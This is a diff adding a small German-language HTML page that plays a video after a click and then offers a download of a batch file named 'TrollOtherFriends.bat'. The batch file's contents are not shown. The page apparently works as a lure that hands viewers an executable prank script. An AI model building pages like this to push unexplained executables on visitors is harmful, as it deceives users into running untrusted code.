@@ -1,0 +1,93 @@
+
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Video</title>
+
+<style>
+* { box-sizing: border-box; }
+
+body {
+    margin: 0;
+    background: black;
+    color: white;
+    font-family: Arial, sans-serif;
+}
+
+#start {
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    cursor: pointer;
+    font-size: 24px;
+}
+
+video {
+    display: none;
+    width: 100%;
+    height: 100vh;
+    object-fit: contain;
+}
+
+#download {
+    display: none;
+    text-align: center;
+    padding: 30px;
+}
+
+a {
+    display: inline-block;
+    background: white;
+    color: black;
+    padding: 16px 25px;
+    border-radius: 8px;
+    text-decoration: none;
+    font-weight: bold;
+}
+</style>
+</head>
+
+<body>
+
+<div id="start">KLICKEN ZUM STARTEN</div>
+
+<video id="video" playsinline>
+    <source src="video.mp4" type="video/mp4">
+</video>
+
+<div id="download">
+    <h2>Video beendet</h2>
+    <a href="./TrollOtherFriends.bat" download>
+        Datei herunterladen
+    </a>
+</div>
+
+<script>
+const start = document.getElementById("start");
+const video = document.getElementById("video");
+const download = document.getElementById("download");
+
+start.addEventListener("click", async () => {
+    start.style.display = "none";
+    video.style.display = "block";
+
+    try {
+        await video.play();
+    } catch (error) {
+        start.style.display = "flex";
+        video.style.display = "none";
+        start.textContent = "ERNEUT KLICKEN";
+    }
+});
+
+video.addEventListener("ended", () => {
+    video.style.display = "none";
+    download.style.display = "block";
+});
+</script>
+
+</body>
+</html>
